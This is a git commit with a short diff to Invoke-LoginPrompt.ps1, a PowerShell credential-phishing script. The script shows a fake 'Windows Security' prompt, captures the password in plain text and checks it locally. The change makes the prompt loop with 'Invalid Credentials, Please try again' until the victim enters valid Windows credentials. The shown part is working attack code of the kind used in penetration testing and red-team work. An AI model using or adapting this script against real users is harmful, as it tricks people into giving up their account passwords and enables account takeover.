de4e9538f208d3919e637621207d796d0e7ac820
enigma0x3 <matthew@webnelson.net>
2015-01-30 10:18:39 -0500

    Update Invoke-LoginPrompt.ps1

--- Invoke-LoginPrompt.ps1
+++ Invoke-LoginPrompt.ps1
@@ -9,8 +9,7 @@ $full = "$domain" + "\" + "$username"
 $password = $cred.GetNetworkCredential().password
 Add-Type -assemblyname System.DirectoryServices.AccountManagement
 $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
-$DS.ValidateCredentials("$full", "$password") | out-null
-if($DS.ValidateCredentials -ne "True"){
+while($DS.ValidateCredentials("$full", "$password") -ne $True){
     $cred = $Host.ui.PromptForCredential("Windows Security", "Invalid Credentials, Please try again", "$env:userdomain\$env:username","")
     $username = "$env:username"
     $domain = "$env:userdomain"
